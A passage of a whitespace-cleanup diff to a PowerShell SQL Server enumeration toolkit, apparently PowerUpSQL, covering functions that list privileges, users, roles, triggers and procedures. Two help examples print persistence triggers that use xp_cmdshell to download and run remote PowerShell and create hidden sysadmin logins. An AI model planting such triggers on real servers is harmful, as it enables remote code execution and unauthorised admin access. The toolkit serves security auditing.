+                LEFT JOIN $DbName.sys.schemas ss
+                ON pm.major_id = ss.schema_id
+                LEFT JOIN $DbName.sys.objects obj
                 ON pm.[major_id] = obj.[object_id] WHERE 1=1
                 $PermissionTypeFilter
                 $PermissionNameFilter
-            $PrincipalNameFilter"               
+            $PrincipalNameFilter"
 
             # Execute Query
             if(-not $SuppressVerbose)
@@ -5545,13 +5550,13 @@ Function  Get-SQLDatabasePriv
 
             # Append results
             $TblDatabasePrivs = $TblDatabasePrivs + $TblDatabaseTemp
-        }          
+        }
     }
 
     End
-    {  
+    {
         # Return data
-        $TblDatabasePrivs           
+        $TblDatabasePrivs
     }
 }
 
@@ -5560,21 +5565,21 @@ Function  Get-SQLDatabasePriv
 #  Get-SQLDatabaseUser
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLDatabaseUser 
+Function  Get-SQLDatabaseUser
 {
     <#
             .SYNOPSIS
             Returns database user information from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DAC
-            Connect using Dedicated Admin Connection. 
+            Connect using Dedicated Admin Connection.
             .PARAMETER DatabaseName
             Database name to filter for.
             .PARAMETER DatabaseUser
@@ -5582,7 +5587,7 @@ Function  Get-SQLDatabaseUser
             .PARAMETER PrincipalName
             Principal name to filter for.
             .PARAMETER NoDefaults
-            Only show information for non default databases.    
+            Only show information for non default databases.
 
             .EXAMPLE
             PS C:\> Get-SQLDatabaseUser -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb -PrincipalName evil
@@ -5616,29 +5621,29 @@ Function  Get-SQLDatabaseUser
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
-        [Parameter(Mandatory = $false,                
-        ValueFromPipelineByPropertyName = $true,
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server database name.')]
         [string]$DatabaseName,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Database user.')]
         [string]$DatabaseUser,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Server login.')]
         [string]$PrincipalName,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Do not show database users associated with default databases.')]
         [Switch]$NoDefaults,
 
@@ -5685,7 +5690,7 @@ Function  Get-SQLDatabaseUser
     }
 
     Process
-    {   
+    {
         # Note: Tables queried by this function typically require sysadmin or DBO privileges.
 
         # Parse computer name from the instance
@@ -5729,7 +5734,7 @@ Function  Get-SQLDatabaseUser
         }
 
         # Get the privs for each database
-        $TblDatabases | 
+        $TblDatabases |
         ForEach-Object -Process {
             # Set DatabaseName filter
             $DbName = $_.DatabaseName
@@ -5754,15 +5759,15 @@ Function  Get-SQLDatabaseUser
                 a.is_fixed_role
                 FROM    [sys].[database_principals] a
                 LEFT JOIN [sys].[server_principals] b
-                ON a.sid = b.sid WHERE 1=1       
+                ON a.sid = b.sid WHERE 1=1
                 $DatabaseUserFilter
-            $PrincipalNameFilter"               
+            $PrincipalNameFilter"
 
             # Execute Query
             $TblDatabaseUsersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
 
             # Update sid formatting for each entry and append results
-            $TblDatabaseUsersTemp | 
+            $TblDatabaseUsersTemp |
             ForEach-Object -Process {
                 # Convert SID to string
                 if($_.PrincipalSid.GetType() -eq [System.DBNull])
@@ -5772,7 +5777,7 @@ Function  Get-SQLDatabaseUser
                 else
                 {
                     # Format principal sid
-                    $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','') 
+                    $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
                     if ($NewSid.length -le 10)
                     {
                         $Sid = [Convert]::ToInt32($NewSid,16)
@@ -5783,8 +5788,8 @@ Function  Get-SQLDatabaseUser
                     }
                 }
 
-                # Add results to table                
-                $TblDatabaseUsers.Rows.Add(
+                # Add results to table
+                $null = $TblDatabaseUsers.Rows.Add(
                     [string]$_.ComputerName,
                     [string]$_.Instance,
                     [string]$_.DatabaseName,
@@ -5795,15 +5800,15 @@ Function  Get-SQLDatabaseUser
                     [string]$_.PrincipalType,
                     [string]$_.default_schema_name,
                     [string]$_.create_date,
-                [string]$_.is_fixed_role) | Out-Null         
+                [string]$_.is_fixed_role)
             }
-        }          
+        }
     }
 
     End
-    {  
+    {
         # Return data
-        $TblDatabaseUsers         
+        $TblDatabaseUsers
     }
 }
 
@@ -5812,23 +5817,23 @@ Function  Get-SQLDatabaseUser
 #  Get-SQLServerRole
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLServerRole 
+Function  Get-SQLServerRole
 {
     <#
             .SYNOPSIS
             Returns SQL Server role information from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER RolePrincipalName
-            Role principal name to filter for. 
+            Role principal name to filter for.
             .PARAMETER RoleOwner
-            Role owner name to filter for. 
+            Role owner name to filter for.
             .EXAMPLE
             PS C:\> Get-SQLServerRole -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1
 
@@ -5844,7 +5849,7 @@ Function  Get-SQLServerRole
             is_fixed_role         : False
             create_date           : 4/13/2009 12:59:06 PM
             modify_Date           : 4/13/2009 12:59:06 PM
-            default_database_name : 
+            default_database_name :
             .EXAMPLE
             PS C:\> Get-SQLInstanceLocal | Get-SQLServerRole -Verbose
     #>
@@ -5862,19 +5867,19 @@ Function  Get-SQLServerRole
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Role name.')]
         [string]$RolePrincipalName,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = "Role owner's name.")]
         [string]$RoleOwner,
 
@@ -5923,9 +5928,9 @@ Function  Get-SQLServerRole
     }
 
     Process
-    { 
+    {
         # Note: Tables queried by this function typically require sysadmin privileges to get all rows
-                   
+
         # Parse computer name from the instance
         $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
 
@@ -5959,7 +5964,7 @@ Function  Get-SQLServerRole
         $Query = "SELECT   '$ComputerName' as [ComputerName],
             '$Instance' as [Instance],
             principal_id as [RolePrincipalId],
-            sid as [RolePrincipalSid], 
+            sid as [RolePrincipalSid],
             name as [RolePrincipalName],
             type_desc as [RolePrincipalType],
             owning_principal_id as [OwnerPrincipalId],
@@ -5968,16 +5973,16 @@ Function  Get-SQLServerRole
             is_fixed_role,
             create_date,
             modify_Date,
-            default_database_name              
+            default_database_name
             FROM [master].[sys].[server_principals] WHERE type like 'R'
             $PrincipalNameFilter
-        $RoleOwnerFilter"   
+        $RoleOwnerFilter"
 
         # Execute Query
         $TblServerRolesTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
-        
+
         # Update sid formatting for each entry
-        $TblServerRolesTemp | 
+        $TblServerRolesTemp |
         ForEach-Object -Process {
             # Format principal sid
             $NewSid = [System.BitConverter]::ToString($_.RolePrincipalSid).Replace('-','')
@@ -6004,14 +6009,14 @@ Function  Get-SQLServerRole
                 [string]$_.is_fixed_role,
                 $_.create_date,
                 $_.modify_Date,
-            [string]$_.default_database_name)         
-        }                        
+            [string]$_.default_database_name)
+        }
     }
 
     End
-    {  
+    {
         # Return data
-        $TblServerRoles          
+        $TblServerRoles
     }
 }
 
@@ -6020,23 +6025,23 @@ Function  Get-SQLServerRole
 #  Get-SQLServerRoleMember
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLServerRoleMember 
+Function  Get-SQLServerRoleMember
 {
     <#
             .SYNOPSIS
             Returns SQL Server role member information from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER RolePrincipalName
-            Role principal name to filter for. 
+            Role principal name to filter for.
             .PARAMETER PrincipalName
-            Principal name to filter for. 
+            Principal name to filter for.
             .EXAMPLE
             PS C:\> Get-SQLServerRoleMember -Instance SQLServer1\STANDARDDEV2014 -PrincipalName MyUser
 
@@ -6077,19 +6082,19 @@ Function  Get-SQLServerRoleMember
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Role name.')]
         [string]$RolePrincipalName,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL login or Windows account name.')]
         [string]$PrincipalName,
 
@@ -6125,7 +6130,7 @@ Function  Get-SQLServerRoleMember
     }
 
     Process
-    {         
+    {
         # Parse computer name from the instance
         $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
 
@@ -6160,7 +6165,7 @@ Function  Get-SQLServerRoleMember
             '$Instance' as [Instance],role_principal_id as [RolePrincipalId],
             SUSER_NAME(role_principal_id) as [RolePrincipalName],
             member_principal_id as [PrincipalId],
-            SUSER_NAME(member_principal_id) as [PrincipalName] 
+            SUSER_NAME(member_principal_id) as [PrincipalName]
             FROM sys.server_role_members WHERE 1=1
             $PrincipalNameFilter
         $RoleOwnerFilter"
@@ -6173,9 +6178,9 @@ Function  Get-SQLServerRoleMember
     }
 
     End
-    {  
+    {
         # Return role members
-        $TblServerRoleMembers             
+        $TblServerRoleMembers
     }
 }
 
@@ -6185,29 +6190,29 @@ Function  Get-SQLServerRoleMember
 # ----------------------------------
 # Author: Scott Sutherland
 # Reference: https://technet.microsoft.com/en-us/library/ms189612(v=sql.105).aspx
-Function  Get-SQLDatabaseRole 
+Function  Get-SQLDatabaseRole
 {
     <#
             .SYNOPSIS
             Returns database role information from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DAC
-            Connect using Dedicated Admin Connection. 
+            Connect using Dedicated Admin Connection.
             .PARAMETER DatabaseName
             Database name to filter for.
             .PARAMETER NoDefaults
             Only select non default databases.
             .PARAMETER RolePrincipalName
-            Role principalname to filter for. 
+            Role principalname to filter for.
             .PARAMETER RoleOwner
-            Role owner's name to filter for.    
+            Role owner's name to filter for.
 
             .EXAMPLE
             PS C:\> Get-SQLDatabaseRole -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb -RolePrincipalName DB_OWNER
@@ -6224,7 +6229,7 @@ Function  Get-SQLDatabaseRole
             is_fixed_role       : True
             create_date         : 4/8/2003 9:10:42 AM
             modify_Date         : 4/13/2009 12:59:14 PM
-            default_schema_name : 
+            default_schema_name :
             .EXAMPLE
             PS C:\> Get-SQLInstanceLocal | Get-SQLDatabaseRole -Verbose
     #>
@@ -6242,24 +6247,24 @@ Function  Get-SQLDatabaseRole
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
-        [Parameter(Mandatory = $false,                
-        ValueFromPipelineByPropertyName = $true,
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server database name.')]
         [string]$DatabaseName,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Role name.')]
         [string]$RolePrincipalName,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = "Role owner's name.")]
         [string]$RoleOwner,
 
@@ -6273,7 +6278,7 @@ Function  Get-SQLDatabaseRole
     )
 
     Begin
-    {                
+    {
         # Setup table for output
         $TblDatabaseRoles = New-Object -TypeName System.Data.DataTable
         $null = $TblDatabaseRoles.Columns.Add('ComputerName')
@@ -6308,11 +6313,11 @@ Function  Get-SQLDatabaseRole
         else
         {
             $RolePrincipalNameFilter = ''
-        }                    
+        }
     }
 
     Process
-    {        
+    {
         # Parse computer name from the instance
         $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
 
@@ -6361,7 +6366,7 @@ Function  Get-SQLDatabaseRole
             if( -not $SuppressVerbose)
             {
                 Write-Verbose -Message "$Instance : Getting roles from the $DbName database."
-            }   
+            }
 
             # Define Query
             $Query = "  USE $DbName;
@@ -6369,7 +6374,7 @@ Function  Get-SQLDatabaseRole
                 '$Instance' as [Instance],
                 '$DbName' as [DatabaseName],
                 principal_id as [RolePrincipalId],
-                sid as [RolePrincipalSid], 
+                sid as [RolePrincipalSid],
                 name as [RolePrincipalName],
                 type_desc as [RolePrincipalType],
                 owning_principal_id as [OwnerPrincipalId],
@@ -6377,17 +6382,17 @@ Function  Get-SQLDatabaseRole
                 is_fixed_role,
                 create_date,
                 modify_Date,
-                default_schema_name              
-                FROM [$DbName].[sys].[database_principals] 
+                default_schema_name
+                FROM [$DbName].[sys].[database_principals]
                 WHERE type like 'R'
                 $RolePrincipalNameFilter
-            $RoleOwnerFilter" 
+            $RoleOwnerFilter"
 
             # Execute Query
-            $TblDatabaseRolesTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose            
+            $TblDatabaseRolesTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
 
             # Update sid formatting for each entry and append results
-            $TblDatabaseRolesTemp | 
+            $TblDatabaseRolesTemp |
             ForEach-Object -Process {
                 # Format principal sid
                 $NewSid = [System.BitConverter]::ToString($_.RolePrincipalSid).Replace('-','')
@@ -6401,7 +6406,7 @@ Function  Get-SQLDatabaseRole
                 }
 
                 # Add results to table
-                $TblDatabaseRoles.Rows.Add(
+                $null = $TblDatabaseRoles.Rows.Add(
                     [string]$_.ComputerName,
                     [string]$_.Instance,
                     [string]$_.DatabaseName,
@@ -6414,15 +6419,15 @@ Function  Get-SQLDatabaseRole
                     [string]$_.is_fixed_role,
                     $_.create_date,
                     $_.modify_Date,
-                [string]$_.default_schema_name) | Out-Null         
-            }              
-        }                                 
+                [string]$_.default_schema_name)
+            }
+        }
     }
 
     End
-    {         
+    {
         # Return data
-        $TblDatabaseRoles         
+        $TblDatabaseRoles
     }
 }
 
@@ -6431,27 +6436,27 @@ Function  Get-SQLDatabaseRole
 #  Get-SQLDatabaseRoleMember
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLDatabaseRoleMember 
+Function  Get-SQLDatabaseRoleMember
 {
     <#
             .SYNOPSIS
             Returns database role member information from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DAC
-            Connect using Dedicated Admin Connection. 
+            Connect using Dedicated Admin Connection.
             .PARAMETER DatabaseName
             Database name to filter for.
             .PARAMETER RolePrincipalName
-            Role principalname to filter for. 
+            Role principalname to filter for.
             .PARAMETER PrincipalName
-            Name of principal or Role to filter for.    
+            Name of principal or Role to filter for.
 
             .EXAMPLE
             PS C:\> Get-SQLDatabaseRoleMember -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb -PrincipalName evil
@@ -6477,12 +6482,12 @@ Function  Get-SQLDatabaseRoleMember
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
@@ -6490,24 +6495,24 @@ Function  Get-SQLDatabaseRoleMember
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
-        [Parameter(Mandatory = $false,                
-        ValueFromPipelineByPropertyName = $true,
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server database name.')]
         [string]$DatabaseName,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Role name.')]
         [string]$RolePrincipalName,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL login or Windows account name.')]
         [string]$PrincipalName,
 
@@ -6547,7 +6552,7 @@ Function  Get-SQLDatabaseRoleMember
     }
 
     Process
-    {        
+    {
         # Note: Tables queried by this function typically require sysadmin or DBO privileges.
 
         # Parse computer name from the instance
@@ -6608,24 +6613,24 @@ Function  Get-SQLDatabaseRoleMember
                 role_principal_id as [RolePrincipalId],
                 USER_NAME(role_principal_id) as [RolePrincipalName],
                 member_principal_id as [PrincipalId],
-                USER_NAME(member_principal_id) as [PrincipalName] 
+                USER_NAME(member_principal_id) as [PrincipalName]
                 FROM [$DbName].[sys].[database_role_members]
                 WHERE 1=1
                 $RolePrincipalNameFilter
-            $PrincipalNameFilter" 
+            $PrincipalNameFilter"
 
             # Execute Query
             $TblDatabaseRoleMembersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
 
             # Append results
             $TblDatabaseRoleMembers = $TblDatabaseRoleMembers + $TblDatabaseRoleMembersTemp
-        }                                         
+        }
     }
 
     End
-    {  
+    {
         # Return data
-        $TblDatabaseRoleMembers        
+        $TblDatabaseRoleMembers
     }
 }
 
@@ -6634,23 +6639,23 @@ Function  Get-SQLDatabaseRoleMember
 #  Get-SQLTriggerDdl
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLTriggerDdl 
+Function  Get-SQLTriggerDdl
 {
     <#
             .SYNOPSIS
             Returns DDL trigger information from target SQL Servers. This includes logon triggers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER TriggerName
-            Trigger name to filter for. 
+            Trigger name to filter for.
             .EXAMPLE
-            PS C:\> Get-SQLTriggerDdl -Instance SQLServer1\STANDARDDEV2014 
+            PS C:\> Get-SQLTriggerDdl -Instance SQLServer1\STANDARDDEV2014
 
             ComputerName      : SQLServer1
             Instance          : SQLServer1\STANDARDDEV2014
@@ -6664,20 +6669,20 @@ Function  Get-SQLTriggerDdl
             ON ALL Server
             FOR DDL_LOGIN_EVENTS
             AS
-                     
+
             -- Download and run a PowerShell script from the internet
-            EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object 
+            EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object
             net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_ddl.ps1'')"';
-                     
+
             -- Add a sysadmin named 'SysAdmin_DDL' if it doesn't exist
             if (SELECT count(name) FROM sys.sql_logins WHERE name like 'SysAdmin_DDL') = 0
-                     
+
             -- Create a login
             CREATE LOGIN SysAdmin_DDL WITH PASSWORD = 'Password123!';
-                        
+
             -- Add the login to the sysadmin fixed server role
             EXEC sp_addsrvrolemember 'SysAdmin_DDL', 'sysadmin';
-                                                    
+
             create_date       : 4/26/2016 8:34:49 PM
             modify_date       : 4/26/2016 8:34:49 PM
             is_ms_shipped     : False
@@ -6699,14 +6704,14 @@ Function  Get-SQLTriggerDdl
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Trigger name.')]
         [string]$TriggerName,
 
@@ -6778,19 +6783,19 @@ Function  Get-SQLTriggerDdl
             is_ms_shipped,
             is_disabled
             FROM [master].[sys].[server_triggers] WHERE 1=1
-        $TriggerNameFilter" 
+        $TriggerNameFilter"
 
         # Execute Query
         $TblDdlTriggersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
 
         # Append results
-        $TblDdlTriggers = $TblDdlTriggers  + $TblDdlTriggersTemp  
+        $TblDdlTriggers = $TblDdlTriggers  + $TblDdlTriggersTemp
     }
 
     End
-    {  
+    {
         # Return data
-        $TblDdlTriggers        
+        $TblDdlTriggers
     }
 }
 
@@ -6799,23 +6804,23 @@ Function  Get-SQLTriggerDdl
 #  Get-SQLTriggerDml
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLTriggerDml 
+Function  Get-SQLTriggerDml
 {
     <#
             .SYNOPSIS
             Returns DML trigger information from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DatabaseName
             Database name to filter for.
             .PARAMETER TriggerName
-            Trigger name to filter for. 
+            Trigger name to filter for.
             .EXAMPLE
             PS C:\> Get-SQLTriggerDml -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb
 
@@ -6829,31 +6834,31 @@ Function  Get-SQLTriggerDml
             ObjectClass            : OBJECT_OR_COLUMN
             TriggerDefinition      : -- Create trigger
             CREATE TRIGGER [persistence_dml_1]
-            ON testdb.dbo.NOCList 
+            ON testdb.dbo.NOCList
             FOR INSERT, UPDATE, DELETE AS
-                          
+
             -- Impersonate sa
             EXECUTE AS LOGIN = 'sa'
-                          
+
             -- Download a PowerShell script from the internet to memory and execute it
-            EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object 
+            EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object
             net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_dml.ps1'')"';
-                          
+
             -- Add a sysadmin named 'SysAdmin_DML' if it doesn't exist
             if (select count(*) from sys.sql_logins where name like 'SysAdmin_DML') = 0
-                          
+
             -- Create a login
             CREATE LOGIN SysAdmin_DML WITH PASSWORD = 'Password123!';
-                             
+
             -- Add the login to the sysadmin fixed server role
             EXEC sp_addsrvrolemember 'SysAdmin_DML', 'sysadmin';
-                         
+
             create_date            : 4/26/2016 8:58:28 PM
             modify_date            : 4/26/2016 8:58:28 PM
             is_ms_shipped          : False
             is_disabled            : False
             is_not_for_replication : False
-            is_instead_of_trigger  : False        
+            is_instead_of_trigger  : False
             .EXAMPLE
             PS C:\> Get-SQLInstanceDomain | Get-SQLTriggerDml -Verbose
     #>
@@ -6871,19 +6876,19 @@ Function  Get-SQLTriggerDml
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
-        [Parameter(Mandatory = $false,                
-        ValueFromPipelineByPropertyName = $true,
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server database name.')]
         [string]$DatabaseName,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Trigger name.')]
         [string]$TriggerName,
 
@@ -6909,7 +6914,7 @@ Function  Get-SQLTriggerDml
     }
 
     Process
-    {        
+    {
         # Note: Tables queried by this function typically require sysadmin privileges to get all rows.
 
         # Parse computer name from the instance
@@ -6941,7 +6946,7 @@ Function  Get-SQLTriggerDml
             }
             return
         }
-            
+
         # Get list of databases
         $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
 
@@ -6957,7 +6962,7 @@ Function  Get-SQLTriggerDml
             }
 
             # Define Query
-            $Query = "  use [$DbName]; 
+            $Query = "  use [$DbName];
                 SELECT  '$ComputerName' as [ComputerName],
                 '$Instance' as [Instance],
                 '$DbName' as [DatabaseName],
@@ -6974,20 +6979,20 @@ Function  Get-SQLTriggerDml
                 is_not_for_replication,
                 is_instead_of_trigger
                 FROM [$DbName].[sys].[triggers] WHERE 1=1
-            $TriggerNameFilter" 
+            $TriggerNameFilter"
 
             # Execute Query
             $TblDmlTriggersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
 
             # Append results
             $TblDmlTriggers = $TblDmlTriggers + $TblDmlTriggersTemp
-        }                                
+        }
     }
 
     End
-    {  
+    {
         # Return data
-        $TblDmlTriggers        
+        $TblDmlTriggers
     }
 }
 
@@ -6996,26 +7001,26 @@ Function  Get-SQLTriggerDml
 #  Get-SQLStoredProcedure
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLStoredProcedure 
+Function  Get-SQLStoredProcedure
 {
     <#
             .SYNOPSIS
             Returns stored procedures from target SQL Servers.
             Note: Viewing procedure definitions requires the sysadmin role or the VIEW DEFINITION permission.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DatabaseName
-            Database name to filter for. 
+            Database name to filter for.
             .PARAMETER ProcedureName
-            Procedure name to filter for. 
+            Procedure name to filter for.
             .PARAMETER NoDefaults
-            Filter out results from default databases. 
+            Filter out results from default databases.
             .EXAMPLE
             PS C:\> Get-SQLStoredProcure -Instance SQLServer1\STANDARDDEV2014 -NoDefaults -DatabaseName testdb
 
@@ -7026,10 +7031,10 @@ Function  Get-SQLStoredProcedure
             ProcedureName       : MyTestProc
